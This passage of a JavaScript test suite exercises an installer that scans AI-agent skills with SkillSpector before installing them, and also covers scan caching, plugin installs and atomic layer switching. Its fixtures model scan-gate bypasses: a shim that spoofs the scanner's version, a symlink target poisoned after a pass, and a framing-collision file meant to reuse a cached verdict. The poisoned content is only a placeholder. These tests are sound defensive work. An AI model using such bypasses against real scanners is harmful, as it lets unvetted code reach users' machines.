      r = run(['--data', data, '--skip-plugins'], realHome,
        { ...process.env, SKILLSPECTOR_VENV: dirname(dirname(scannerBin)) });
      assert.equal(r.status, 0, r.stderr);
      assert.match(r.stdout, new RegExp(`Scanning 0 of ${3 + shippedCount} skill snapshot\\(s\\) \\(${3 + shippedCount} cached\\)`));

      // The divergence itself: a build that answers the version probe with the pin but
      // behaves like an older release (a stale, shadowed, or patched install) flips the
      // verdict to the host side — P1 resurfaces — and the run must refuse instead of
      // installing on it. The shim wraps the real venv interpreter with a shadowed
      // importlib.metadata, POSIX-only like the stubs above.
      const shimDir = join(tmp, 'shadow-venv');
      mkdirSync(join(shimDir, 'bin'), { recursive: true });
      const shadowPy = join(tmp, 'shadow.py');
      writeFileSync(shadowPy, [
        "import sys",
        "if '--version' in sys.argv[1:]:",
        "    print('SkillSpector v2.13.0')",
        "    raise SystemExit(0)",
        "import importlib.metadata as im",
        "_real = im.version",
        "im.version = lambda name, *a, **k: '2.12.0' if name == 'skillspector' else _real(name, *a, **k)",
        "from skillspector.cli import app",
        "app()",
      ].join('\n'));
      writeFileSync(join(shimDir, 'bin', 'skillspector'), `#!/bin/sh\nexec '${join(dirname(scannerBin), 'python')}' '${shadowPy}' "$@"\n`);
      chmodSync(join(shimDir, 'bin', 'skillspector'), 0o755);
      r = run(['--data', data, '--skip-plugins'], join(tmp, 'diverge-home'),
        { ...process.env, SKILLSPECTOR_VENV: shimDir });
      assert.equal(r.status, 1, 'a build that diverges from the pin refuses the run');
      assert.match(r.stdout, /SkillSpector rejected/);
      assert.match(r.stdout, /break-ui/);
      assert.ok(!existsSync(join(tmp, 'diverge-home', '.agents/skills/break-ui/SKILL.md')), 'the diverged verdict never installs');
      rmSync(join(data, 'user/agents/skills/break-ui'), { recursive: true, force: true });
    }

    // The managed-skills root is a skill snapshot too: the gate must scan it like the
    // other roots, else a poisoned managed skill would install unscanned.
    put('omp/agent/managed-skills/garded/SKILL.md', skillText('garded'));
    r = run(['--data', data, '--skip-plugins']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${2 + shippedCount} skill snapshot\\(s\\) \\(${1 + shippedCount} cached\\)`));
    assert.ok(readFileSync(callsLog, 'utf8').includes(join(data, 'user/omp/agent/managed-skills/garded')), 'the managed-skills snapshot is scanned');

    // The scan cache and the pool, on a controlled fixture: nine skills in a fresh data dir
    // and a fresh home. The timing stub logs each scan's start and end, so the suite proves
    // what the deploy seed needs: a warm cache scans nothing, one changed byte rescans one
    // skill, a scanner-version change rescans everything, a rejection writes no cache entry,
    // and concurrent scans never exceed min(8, availableParallelism()).
    const cacheData = join(tmp, 'cache-data');
    const cacheHome = join(tmp, 'cache-home');
    const cacheCalls = join(stubDir, 'cache-calls.log');
    const cacheSkills = ['alpha', 'beta', 'gamma', 'delta', 'epsilon', 'zeta', 'eta', 'theta', 'iota'];
    mkdirSync(join(cacheData, 'user/omp/agent'), { recursive: true });
    writeFileSync(join(cacheData, 'user/omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
    for (const skill of cacheSkills) {
      mkdirSync(join(cacheData, 'user/omp/agent/skills', skill), { recursive: true });
      writeFileSync(join(cacheData, 'user/omp/agent/skills', skill, 'SKILL.md'), skillText(skill));
    }
    const writeTimingStub = () => {
      writeFileSync(join(stubDir, 'skillspector'), `#!/bin/sh\nif [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi\nprintf 'start %s %s\\n' "$2" "$(date +%s%N)" >> '${cacheCalls}'\nsleep 0.3\nprintf 'end %s %s\\n' "$2" "$(date +%s%N)" >> '${cacheCalls}'\nexit 0\n`);
      chmodSync(join(stubDir, 'skillspector'), 0o755);
    };
    const scanCalls = () => readFileSync(cacheCalls, 'utf8');

    // Cold run: everything scans, at most min(8, availableParallelism()) at a time, and the
    // scans genuinely overlap instead of serializing.
    writeTimingStub();
    rmSync(cacheCalls, { force: true });
    r = run(['--data', cacheData, '--skip-plugins'], cacheHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning ${cacheSkills.length + shippedCount} of ${cacheSkills.length + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`));
    const spans = new Map();
    for (const line of scanCalls().trim().split('\n')) {
      const [kind, dir, ts] = line.split(' ');
      if (kind === 'start') spans.set(dir, { start: Number(ts) });
      else spans.get(dir).end = Number(ts);
    }
    assert.equal(spans.size, cacheSkills.length + shippedCount, 'the cold run scanned every skill');
    assert.ok([...spans.values()].every(s => s.end > s.start), 'every logged scan has a start and an end');
    const limit = Math.min(8, availableParallelism());
    const events = [...spans.values()].flatMap(s => [[s.start, 1], [s.end, -1]])
      .sort((a, b) => a[0] - b[0] || a[1] - b[1]);
    let open = 0;
    let peak = 0;
    for (const [, d] of events) { open += d; peak = Math.max(peak, open); }
    assert.ok(peak <= limit, `the pool never exceeds min(8, availableParallelism()): peak ${peak} > ${limit}`);
    assert.ok(peak >= Math.min(2, limit), `the scans overlap instead of serializing: peak ${peak}`);

    // A warm cache scans nothing and says so in one line.
    const warmBefore = scanCalls();
    r = run(['--data', cacheData, '--skip-plugins'], cacheHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning 0 of ${cacheSkills.length + shippedCount} skill snapshot\\(s\\) \\(${cacheSkills.length + shippedCount} cached\\)`));
    assert.equal(scanCalls(), warmBefore, 'a cache hit runs no scanner');

    // One changed byte in one skill rescans exactly that skill.
    writeFileSync(join(cacheData, 'user/omp/agent/skills/beta/SKILL.md'), skillText('beta', '# beta, v2\n'));
    r = run(['--data', cacheData, '--skip-plugins'], cacheHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${cacheSkills.length + shippedCount} skill snapshot\\(s\\) \\(${cacheSkills.length - 1 + shippedCount} cached\\)`));
    const delta = scanCalls().slice(warmBefore.length);
    const deltaStarts = delta.trim().split('\n').filter(l => l.startsWith('start '));
    assert.equal(deltaStarts.length, 1, 'only the changed skill is scanned');
    assert.ok(deltaStarts[0].includes(join(cacheData, 'user/omp/agent/skills/beta')), delta);

    // A rejection writes no cache entry: the pass file is byte-identical across a failed run.
    // Beta's new bytes miss the cache, the scan rejects them, and nothing is recorded.
    const passFile = join(cacheHome, '.alate', 'skillspector-pass.json');
    const cachePassesBefore = readFileSync(passFile, 'utf8');
    writeFileSync(join(cacheData, 'user/omp/agent/skills/beta/SKILL.md'), skillText('beta', '# beta, v3\n'));
    writeStub(1, 'SkillSpector v2.13.0', ['beta']);
    r = run(['--data', cacheData, '--skip-plugins'], cacheHome);
    assert.equal(r.status, 1, 'findings fail the run');
    assert.ok(r.stdout.includes('SkillSpector rejected') && r.stdout.includes(join(cacheData, 'user/omp/agent/skills/beta')), r.stdout);
    assert.equal(readFileSync(passFile, 'utf8'), cachePassesBefore, 'a failed scan is never cached');
    const failTail = r.stdout.trim().split('\n').pop();
    assert.ok(failTail.includes('user/omp/agent/skills/beta — rejected: SC2 at SKILL.md:7'), failTail);
    // The other eight skills still install and cache while beta alone is rejected.
    const cacheRecord = JSON.parse(readFileSync(join(cacheHome, '.alate/installed.json'), 'utf8'));
    assert.ok(!Object.keys(cacheRecord).some(rel => rel.startsWith('omp/agent/skills/beta')), 'the rejected skill leaves the manifest');
    assert.ok(Object.keys(cacheRecord).filter(rel => rel.startsWith('omp/agent/skills/')).length >= 8, 'the other skills stay recorded');
    // A later clean run rescans beta (no negative caching) and installs it.
    writeStub(0);
    writeFileSync(join(cacheData, 'user/omp/agent/skills/beta/SKILL.md'), skillText('beta', '# beta, v4\n'));
    r = run(['--data', cacheData, '--skip-plugins'], cacheHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${cacheSkills.length + shippedCount} skill snapshot\\(s\\) \\(${cacheSkills.length - 1 + shippedCount} cached\\)`));
    assert.equal(readFileSync(join(cacheHome, '.omp/agent/skills/beta/SKILL.md'), 'utf8'), skillText('beta', '# beta, v4\n'));

    // A scanner-version change rescans everything: the same bytes under a different pin are
    // different keys, proved through a copy of the script pinned one version higher.
    writeStub(0, 'SkillSpector v2.14.0');
    const pinnedDir = join(tmp, 'tool-v2-14');
    mkdirSync(join(pinnedDir, 'lib'), { recursive: true });
    copyFileSync(fileURLToPath(new URL('./lib/data.mjs', import.meta.url)), join(pinnedDir, 'lib', 'data.mjs'));
    copyFileSync(fileURLToPath(new URL('./lib/shipped.mjs', import.meta.url)), join(pinnedDir, 'lib', 'shipped.mjs'));
    copyTree(fileURLToPath(new URL('./shipped/ottr', import.meta.url)), join(pinnedDir, 'shipped', 'ottr'));
    const swapped = readFileSync(fileURLToPath(new URL('./install-user.mjs', import.meta.url)), 'utf8')
      // Stryker's sandbox copy instruments the pin literal, so the exact declaration
      // never matches there; replace the whole declaration line instead. Mutant runs
      // flip the instrumented switches elsewhere in the copy as usual.
      .replace(/^const SKILLSPECTOR_REF = .*$/m, "const SKILLSPECTOR_REF = 'v2.14.0';");
    assert.ok(swapped.includes("const SKILLSPECTOR_REF = 'v2.14.0';"), 'the pin swap took');
    writeFileSync(join(pinnedDir, 'install-user.mjs'), swapped);
    r = spawnSync(process.execPath, [join(pinnedDir, 'install-user.mjs'), '--home', cacheHome, '--data', cacheData, '--skip-plugins'], {
      encoding: 'utf8',
      env: sandbox({ ...process.env, PATH: `${stubDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv') }),
    });
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning ${cacheSkills.length + shippedCount} of ${cacheSkills.length + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`));
    writeStub(0);

    // The cache key binds the bytes the install copies, proved with the two review repros
    // on dedicated fixtures (each: run 1 passes and caches, run 2 plants EVIL bytes the old
    // key would have covered; the gate must rescan and refuse).
    // Repro 1 (symlink): the skill holds run.sh -> ../../notes/run.sh, and the link target is
    // poisoned after the pass. The link text never changes, so a key over link text stays
    // cached and installs EVIL; a key over the resolved target bytes (what readFileSync
    // copies) must miss, rescan, and refuse.
    const linkData = join(tmp, 'link-data');
    const linkHome = join(tmp, 'link-home');
    mkdirSync(join(linkData, 'user/omp/agent/notes'), { recursive: true });
    mkdirSync(join(linkData, 'user/omp/agent/skills/mine'), { recursive: true });
    writeFileSync(join(linkData, 'user/omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
    writeFileSync(join(linkData, 'user/omp/agent/skills/mine/SKILL.md'), skillText('mine'));
    writeFileSync(join(linkData, 'user/omp/agent/notes/run.sh'), 'echo ok\n');
    symlinkSync('../../notes/run.sh', join(linkData, 'user/omp/agent/skills/mine/run.sh'));
    writeStub(0);
    r = run(['--data', linkData, '--skip-plugins'], linkHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning ${1 + shippedCount} of ${1 + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`));
    assert.equal(readFileSync(join(linkHome, '.omp/agent/skills/mine/run.sh'), 'utf8'), 'echo ok\n', 'the install copies the resolved target bytes');
    const linkPasses = readFileSync(join(linkHome, '.alate', 'skillspector-pass.json'), 'utf8');
    writeFileSync(join(linkData, 'user/omp/agent/notes/run.sh'), 'EVIL\n');
    writeStub(1, 'SkillSpector v2.13.0', ['mine']);
    r = run(['--data', linkData, '--skip-plugins'], linkHome);
    assert.equal(r.status, 1, 'a poisoned link target fails the run');
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${1 + shippedCount} skill snapshot\\(s\\) \\(${shippedCount} cached\\)`), 'the changed target bytes miss the cache');
    assert.ok(r.stdout.includes('SkillSpector rejected') && r.stdout.includes(join(linkData, 'user/omp/agent/skills/mine')), r.stdout);
    assert.equal(readFileSync(join(linkHome, '.alate', 'skillspector-pass.json'), 'utf8'), linkPasses, 'a failed scan is never cached');
    assert.ok(!existsSync(join(linkHome, '.omp/agent/skills/mine')), 'the poisoned skill is deleted like any rejected one');
    // Restore the clean state the version-pin blocks below count on.
    writeStub(0);
    writeFileSync(join(linkData, 'user/omp/agent/notes/run.sh'), 'echo ok\n');
    r = run(['--data', linkData, '--skip-plugins'], linkHome);
    assert.equal(r.status, 0, r.stderr);

    // Repro 2 (framing): a.bin holding "X" plus "f\0z.sh\0EVIL\n" must not key the same as a
    // re-split {a.bin: X, z.sh: EVIL}; the rel\0size\0sha256 framing keeps every entry
    // self-delimiting, so the new tree rescan instead of riding the old pass.
    const frameData = join(tmp, 'frame-data');
    const frameHome = join(tmp, 'frame-home');
    mkdirSync(join(frameData, 'user/omp/agent/skills/mine'), { recursive: true });
    writeFileSync(join(frameData, 'user/omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
    writeFileSync(join(frameData, 'user/omp/agent/skills/mine/SKILL.md'), skillText('mine'));
    const fused = 'X' + 'f\0z.sh\0EVIL\n';
    writeFileSync(join(frameData, 'user/omp/agent/skills/mine/a.bin'), fused);
    writeStub(0);
    r = run(['--data', frameData, '--skip-plugins'], frameHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning ${1 + shippedCount} of ${1 + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`));
    assert.equal(readFileSync(join(frameHome, '.omp/agent/skills/mine/a.bin'), 'utf8'), fused);
    const framePasses = readFileSync(join(frameHome, '.alate', 'skillspector-pass.json'), 'utf8');
    writeFileSync(join(frameData, 'user/omp/agent/skills/mine/a.bin'), 'X');
    writeFileSync(join(frameData, 'user/omp/agent/skills/mine/z.sh'), 'EVIL\n');
    writeStub(1, 'SkillSpector v2.13.0', ['mine']);
    r = run(['--data', frameData, '--skip-plugins'], frameHome);
    assert.equal(r.status, 1, 'the re-split tree fails the run');
    assert.match(r.stdout, new RegExp(`Scanning 1 of ${1 + shippedCount} skill snapshot\\(s\\) \\(${shippedCount} cached\\)`), 'the re-split bytes miss the cache');
    assert.ok(r.stdout.includes('SkillSpector rejected') && r.stdout.includes(join(frameData, 'user/omp/agent/skills/mine')), r.stdout);
    assert.equal(readFileSync(join(frameHome, '.alate', 'skillspector-pass.json'), 'utf8'), framePasses, 'a failed scan is never cached');
    assert.ok(!existsSync(join(frameHome, '.omp/agent/skills/mine/z.sh')), 'the split-out file never lands');
    assert.ok(!existsSync(join(frameHome, '.omp/agent/skills/mine')), 'the rejected skill is deleted like any rejected one');

    // A pre-token entry misses exactly once: stripping the key's format token (the only
    // difference an older alate's pass file has) forces one rescan, and the rewritten pass
    // carries the tokened key again, so the next run is warm.
    const verData = join(tmp, 'ver-data');
    const verHome = join(tmp, 'ver-home');
    mkdirSync(join(verData, 'user/omp/agent/skills/solo'), { recursive: true });
    writeFileSync(join(verData, 'user/omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
    writeFileSync(join(verData, 'user/omp/agent/skills/solo/SKILL.md'), skillText('solo'));
    writeStub(0);
    r = run(['--data', verData, '--skip-plugins'], verHome);
    assert.equal(r.status, 0, r.stderr);
    const verPass = join(verHome, '.alate', 'skillspector-pass.json');
    const verKey = Object.keys(JSON.parse(readFileSync(verPass, 'utf8')))[0];
    const legacy = { [verKey.replace(/^\S+\s/, '')]: true };
    writeFileSync(verPass, `${JSON.stringify(legacy, null, 2)}\n`);
    r = run(['--data', verData, '--skip-plugins'], verHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning ${1 + shippedCount} of ${1 + shippedCount} skill snapshot\\(s\\) \\(0 cached\\)`), 'a legacy entry without the format token misses');
    assert.equal(JSON.parse(readFileSync(verPass, 'utf8'))[verKey], true, 'the fresh pass carries the tokened key');
    r = run(['--data', verData, '--skip-plugins'], verHome);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, new RegExp(`Scanning 0 of ${1 + shippedCount} skill snapshot\\(s\\) \\(${1 + shippedCount} cached\\)`));

    // A Windows bind mount (the board-seed `-v <data-repo>:/data:ro` shape) marks every file
    // executable, and the pinned scanner reads a mode-carried exec bit on the dot-named
    // shipped baseline as a concealed executable (SC9, HIGH) — without the staging copy the
    // install drops every skill that ships a baseline. The stand-in scanner rejects exactly
    // what the pinned build rejects there — a scan target whose baseline is executable —
    // and logs whether each scan target carries the baseline, so a staged copy must scan
    // clean with the baseline present. The clean-modes skill keeps scanning in place, both
    // skills install, and the warm cache reuses the staged verdict without staging again.
    const winData = join(tmp, 'win-data');
    const winHome = join(tmp, 'win-home');
    const winBaselineLog = join(stubDir, 'win-baseline.log');
    mkdirSync(join(winData, 'user/omp/agent/skills/windy'), { recursive: true });
    mkdirSync(join(winData, 'user/omp/agent/skills/calm'), { recursive: true });
    writeFileSync(join(winData, 'user/omp/agent/config.yml'), 'modelRoles:\n  default: zai/glm\n');
    writeFileSync(join(winData, 'user/omp/agent/skills/windy/SKILL.md'), skillText('windy'));
    writeFileSync(join(winData, 'user/omp/agent/skills/windy/.skillspector-baseline.yaml'), 'version: 2\nscanner_version: 2.13.0\nfindings: []\n');
    writeFileSync(join(winData, 'user/omp/agent/skills/calm/SKILL.md'), skillText('calm'));
    writeFileSync(join(winData, 'user/omp/agent/skills/calm/.skillspector-baseline.yaml'), 'version: 2\nscanner_version: 2.13.0\nfindings: []\n');
    chmodSync(join(winData, 'user/omp/agent/skills/windy/SKILL.md'), 0o777);
    chmodSync(join(winData, 'user/omp/agent/skills/windy/.skillspector-baseline.yaml'), 0o777);
    const writeWinStub = () => {
      writeFileSync(join(stubDir, 'skillspector'), `#!/bin/sh
[ "$1" = scan ] && printf '%s\\n' "$*" >> '${callsLog}'
[ "$1" = scan ] && printf 'baseline=%s %s\\n' "$([ -f "$2/.skillspector-baseline.yaml" ] && echo yes || echo no)" "$2" >> '${winBaselineLog}'
if [ "$1" = "--version" ]; then echo 'SkillSpector v2.13.0'; exit 0; fi
if [ "$1" = scan ] && [ -x "$2/.skillspector-baseline.yaml" ]; then
  printf '  HIGH: SC9 - Concealed Executable Artifact...\\n    Location: .skillspector-baseline.yaml:1\\n'
  exit 1
fi
exit 0
`);
      chmodSync(join(stubDir, 'skillspector'), 0o755);
    };
    writeWinStub();
    rmSync(winBaselineLog, { force: true });
    r = run(['--data', winData, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, r.stderr);
    assert.ok(r.stdout.includes(`Scanning ${2 + shippedCount} of ${2 + shippedCount} skill snapshot(s) (0 cached)`), r.stdout);
    assert.ok(existsSync(join(winHome, '.omp/agent/skills/windy/SKILL.md')), 'the 0777 skill installs');
    assert.ok(existsSync(join(winHome, '.omp/agent/skills/calm/SKILL.md')), 'the clean-modes skill installs');
    const winTargets = readFileSync(callsLog, 'utf8').trim().split('\n')
      .filter(line => line.startsWith('scan '))
      .map(line => line.slice('scan '.length, line.indexOf(' --no-llm')));
    const windyTarget = winTargets.find(dir => dir.endsWith('windy'));
    assert.ok(windyTarget, 'the 0777 skill is scanned');
    assert.ok(!windyTarget.startsWith(winData), `the 0777 skill scans through a staging copy, not the data folder: ${windyTarget}`);
    const calmTarget = winTargets.find(dir => dir.startsWith(winData));
    assert.equal(calmTarget, join(winData, 'user/omp/agent/skills/calm'), 'the clean-modes skill scans in place');
    const winScans = readFileSync(winBaselineLog, 'utf8').trim().split('\n').map(line => {
      const match = line.match(/^baseline=(\S+) (.*)$/);
      return { baseline: match[1], dir: match[2] };
    });
    const windyScan = winScans.find(scan => scan.dir.endsWith('windy'));
    assert.ok(windyScan && windyScan.baseline === 'yes', `the staged copy carries the shipped baseline: ${JSON.stringify(windyScan)}`);
    const calmScan = winScans.find(scan => scan.dir === join(winData, 'user/omp/agent/skills/calm'));
    assert.ok(calmScan && calmScan.baseline === 'yes', 'the in-place scan still sees the baseline');
    assert.ok(!existsSync(dirname(windyTarget)), 'the staging copy is removed after the run');
    const winWarmBefore = readFileSync(callsLog, 'utf8');
    r = run(['--data', winData, '--skip-plugins'], winHome);
    assert.equal(r.status, 0, r.stderr);
    assert.ok(r.stdout.includes(`Scanning 0 of ${2 + shippedCount} skill snapshot(s) (${2 + shippedCount} cached)`), r.stdout);
    assert.equal(readFileSync(callsLog, 'utf8'), winWarmBefore, 'a warm cache reuses the staged verdict and stages nothing');
    writeStub(0);
  } else {
    console.log('win32: the scanner-stub checks need a real skillspector on PATH; gate assertions skipped');
  }

  // The plugins block: with omp/plugins/package.json in the snapshot and no --skip-plugins,
  // the script runs `bun install --frozen-lockfile --backend copyfile` (plus --ignore-scripts
  // unless the data repo allows plugin scripts) with cwd <home>/.omp/plugins through a stub
  // bun that records argv and cwd; a missing bun and a failing bun fail with distinct
  // messages, and --skip-plugins never spawns bun at all.
  if (scanned) {
    const bunLog = join(stubDir, 'bun-calls.log');
    const bunDir = join(tmp, 'bun-stub');
    mkdirSync(bunDir, { recursive: true });
    const writeBun = exit => {
      rmSync(bunLog, { force: true });
      writeFileSync(join(bunDir, 'bun'), `#!/bin/sh\n{ pwd; printf '%s\\n' "$@"; } >> '${bunLog}'\nexit ${exit}\n`);
      chmodSync(join(bunDir, 'bun'), 0o755);
    };
    const bunEnv = { ...process.env, PATH: `${stubDir}${delimiter}${bunDir}${delimiter}${process.env.PATH ?? ''}`, SKILLSPECTOR_VENV: join(tmp, 'no-venv') };
    const plugHome = join(tmp, 'plug-home');
    writeBun(0);
    let r = run(['--data', data], plugHome, bunEnv);
    assert.equal(r.status, 0, r.stderr);
    assert.doesNotMatch(r.stdout, /plugins skipped/, 'a real plugin install is never reported as skipped');
    assert.equal(readFileSync(bunLog, 'utf8'),
      `${join(plugHome, '.omp', 'plugins')}\ninstall\n--frozen-lockfile\n--backend\ncopyfile\n--ignore-scripts\n`,
      'bun runs install --frozen-lockfile --backend copyfile --ignore-scripts inside <home>/.omp/plugins');
    // --skip-plugins never spawns bun even though the snapshot ships plugins/package.json.
    rmSync(bunLog, { force: true });
    r = run(['--data', data, '--skip-plugins'], plugHome, bunEnv);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /plugins skipped/);
    assert.ok(!existsSync(bunLog), 'a skipped install never invokes bun');
    // A bun that fails is an error naming the plugins directory.
    writeBun(1);
    r = run(['--data', data], plugHome, bunEnv);
    assert.equal(r.status, 1);
    assert.ok(r.stderr.includes(`bun install failed in ${join(plugHome, '.omp', 'plugins')}`), r.stderr);
    // A missing bun is a distinct, clearer error.
    r = run(['--data', data], plugHome, { ...process.env, PATH: stubDir, SKILLSPECTOR_VENV: join(tmp, 'no-venv') });
    assert.equal(r.status, 1);
    assert.match(r.stderr, /bun not found; cannot install plugins\./);
  } else {
    console.log('win32: the bun-stub checks need extensionless stubs; skipped');
  }

  // Layer mode (POSIX only: the switch is a symlink rename): each provision installs into a
  // fresh .alate/layers/<commit>-<n> folder and switches .alate/current with one atomic
  // rename, so nothing a running turn reads ever changes (specs/agent-layer-switch.md). The
  // fixture data dir carries a data-root rule (installed by sync.mjs into the layer) and a
  // marketplaces.json whose catalogPath points into the home, to prove captured paths
  // re-root into the layer.
  if (process.platform === 'win32') {
    console.log('win32: the layer-switch checks need symlink privileges; skipped');
  } else {
    // install-user canonicalizes the layer home (a --home through a symlink or a relative
    // --home must behave exactly like its resolved path), so the fixture spellings are
    // canonical too: the captured catalogPath must hit the remap prefix, and the
    // realpath/readlink assertions compare canonical strings on every platform.
    const tmpReal = realpathSync(tmp);
    const ldata = join(tmpReal, 'data-layer');
    const putL = (rel, text) => { mkdirSync(dirname(join(ldata, 'user', rel)), { recursive: true }); writeFileSync(join(ldata, 'user', rel), text); };
    const layerHome = join(tmpReal, 'layer-home');
    const lconfig = 'modelRoles:\n  default: zai/glm\n';
    putL('omp/agent/config.yml', lconfig);
    putL('omp/agent/marketplaces.json', `${JSON.stringify({ marketplaces: [
      { name: 'm', catalogPath: `${layerHome}/.omp/marketplaces/catalog.json` },
      { name: 'w', catalogPath: 'C:\\Users\\me\\.omp\\marketplaces\\win.json' },
    ] }, null, 2)}\n`);
    putL('omp/agent/skills/mine/SKILL.md', skillText('mine'));
    mkdirSync(join(ldata, 'workers', 'web'), { recursive: true });
    writeFileSync(join(ldata, 'workers', 'web', 'apt.txt'), 'libnss3\n');
    writeFileSync(join(ldata, 'layer-rule.md'), '---\ndescription: layer test rule\n---\n\nBody\n');
    const lbase = join(layerHome, '.alate');
    const llayers = join(lbase, 'layers');
    const lcurrent = join(lbase, 'current');
    const runL = (h, extra) => run(['--data', ldata, ...extra], h);
    const lgot = (layer, rel) => readFileSync(join(layer, rel), 'utf8');
    // A pinned turn resolves current once and never follows a later switch: its whole tree
    // must stay byte-identical across any number of provisions.
    const snapshotTree = root => {
      const out = {};
      const walkTree = dir => {
        for (const e of readdirSync(dir, { withFileTypes: true })) {
          const p = join(dir, e.name);
          if (e.isSymbolicLink()) out[p] = readlinkSync(p);
          else if (e.isDirectory()) walkTree(p);
          else out[p] = readFileSync(p);
        }
      };
      walkTree(root);
      return out;
    };

    // Happy path: layer created, switched by symlink, rules and worker lists and records inside.
    let r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-1'], 'the layer id is the data commit plus a counter');
    assert.ok(lstatSync(lcurrent).isSymbolicLink(), 'current is a symlink');
    const l1 = realpathSync(lcurrent);
    assert.equal(l1, join(llayers, 'nogit-1'));
    assert.equal(lgot(l1, '.omp/agent/config.yml'), lconfig);
    assert.equal(lgot(l1, '.ottr/workers/web/apt.txt'), 'libnss3\n');
    assert.equal(lgot(l1, '.omp/agent/rules/layer-rule.md'), '---\ndescription: layer test rule\n---\n\nBody\n', 'data-root rules land in the layer through sync.mjs');
    assert.ok(JSON.parse(lgot(l1, '.alate/installed.json'))['omp/agent/config.yml'], 'the install record rides in the layer');
    assert.equal(JSON.parse(lgot(l1, '.omp/agent/marketplaces.json')).marketplaces[0].catalogPath,
      join(l1, '.omp/marketplaces/catalog.json'), 'captured home paths re-root into the layer');
    assert.equal(JSON.parse(lgot(l1, '.omp/agent/marketplaces.json')).marketplaces[1].catalogPath,
      join(l1, '.omp/marketplaces/win.json'), 'a captured Windows path re-roots into the layer exactly once');
    assert.ok(lstatSync(join(l1, '.omp/agent/agent.db')).isSymbolicLink(), 'shared state links back to the home');
    assert.equal(readlinkSync(join(l1, '.omp/agent/agent.db')), join(layerHome, '.omp/agent/agent.db'));
    assert.ok(lstatSync(join(l1, '.omp/oauth')).isSymbolicLink());
    assert.ok(lstatSync(join(l1, '.gitconfig')).isSymbolicLink());
    assert.ok(!existsSync(join(layerHome, '.omp/agent/agent.db')), 'the shared credential store never becomes a real file');
    assert.match(r.stdout, /switched /);

    // A provision while a turn runs: the pinned layer is untouched, the new layer goes live.
    const pinned = l1;
    const pinnedTree = snapshotTree(pinned);
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-1', 'nogit-2']);
    assert.equal(realpathSync(lcurrent), join(llayers, 'nogit-2'));
    assert.deepEqual(snapshotTree(pinned), pinnedTree, 'a pinned turn keeps its layer byte for byte');

    // Clean-up keeps the current layer and the one before it.
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3'], 'cleanup keeps the current layer and the one before it');

    // A layer a running turn holds (in-use.json, the runner's record) survives clean-up; an
    // unreadable record stops deletion, safety over disk space.
    writeFileSync(join(lbase, 'in-use.json'), JSON.stringify({ layers: ['nogit-2'] }));
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3', 'nogit-4'], 'an in-use layer survives cleanup');
    writeFileSync(join(lbase, 'in-use.json'), '{');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /in-use\.json unreadable; keeping every layer/);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-2', 'nogit-3', 'nogit-4', 'nogit-5']);
    writeFileSync(join(lbase, 'in-use.json'), '{"layers":[]}');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.deepEqual(readdirSync(llayers).sort(), ['nogit-5', 'nogit-6'], 'a valid empty record lets cleanup run again');

    // Machine state wins in layer mode: a machine edit beyond the deployment blocks rides
    // into the new layer (a top-level memoryBackend: key is machine content too — the strip
    // only removes backend: under memory:), the blocks ride along either way, and block
    // content never reaches the output.
    const blocksL = 'hindsight:\n  apiUrl: http://nas:8888\n  apiToken: $HINDSIGHT_TOKEN\n';
    const live6 = lgot(join(llayers, 'nogit-6'), '.omp/agent/config.yml');
    writeFileSync(join(llayers, 'nogit-6', '.omp/agent/config.yml'), live6.replace('zai/glm', 'zai/glm-edited') + blocksL);
    putL('omp/agent/config.yml', 'modelRoles:\n  default: zai/glm-5.3\n');
    r = runL(layerHome, ['--skip-plugins', '--layer']);
    assert.equal(r.status, 0, r.stderr);
    assert.match(r.stdout, /machine change kept: /);
    assert.equal(lgot(join(llayers, 'nogit-7'), '.omp/agent/config.yml'),
      live6.replace('zai/glm', 'zai/glm-edited') + blocksL, 'machine bytes win and the blocks ride along');
    assert.ok(!`${r.stdout}${r.stderr}`.includes('apiToken') && !`${r.stdout}${r.stderr}`.includes('nas:8888'),
      'deployment block content is never printed');
    r = runL(layerHome, ['--skip-plugins', '--layer', '--force']);
    assert.equal(r.status, 0, r.stderr);
